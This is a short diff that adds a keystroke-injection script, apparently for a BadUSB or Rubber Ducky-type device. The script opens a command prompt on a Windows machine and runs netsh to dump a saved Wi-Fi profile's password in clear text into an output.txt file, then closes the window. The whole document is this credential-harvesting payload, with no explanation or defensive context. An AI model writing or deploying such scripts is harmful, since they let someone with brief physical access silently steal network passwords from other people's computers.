@@ -1,0 +1,19 @@
+DELAY 1000
+TYPE "GUI" "r"
+DELAY 1000
+
+STRING "cmd"
+DELAY 1000
+TYPE "ENTER"
+DELAY 2000
+
+STRING "netsh wlan show profile H369A4A3EDA key=clear | FIND "Key Content " >" "SCRIPT"
+STRING "\output.txt"
+DELAY 1000
+TYPE "ENTER"
+DELAY 1000
+
+STRING "exit"
+DELAY 1000
+TYPE "ENTER"
+DELAY 1000
